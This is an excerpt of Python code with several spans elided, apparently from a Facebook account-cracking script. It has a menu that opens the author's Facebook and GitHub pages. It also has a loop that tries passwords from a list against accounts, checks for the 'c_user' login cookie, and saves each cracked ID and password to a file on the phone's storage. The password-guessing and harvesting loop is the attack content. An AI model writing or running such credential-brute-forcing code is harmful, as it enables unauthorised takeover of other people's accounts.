...
def admin():
	...
	if bal =='1':
		...
		admin()
	if bal =='2':
		os.system('xdg-open https://www.facebook.com/SHAKIL191');time.sleep(1)
		admin()
	if bal =='3':
		os.system('xdg-open https://github.com/SHAKIL-1-2/told/tree/main');time.sleep(1)
		admin()
	if bal =='0':
		Main()
    ...
    try:
        for ps in pwx:
            ...
            if 'c_user' in log_cookies:
                ...
                oks.append(cid)
                open('/sdcard/SHAKIL-143-ok.txt', 'a').write(cid+' | '+ps+' | '+uid+'\n')
                break
            else:
                continue
        loop+=1        
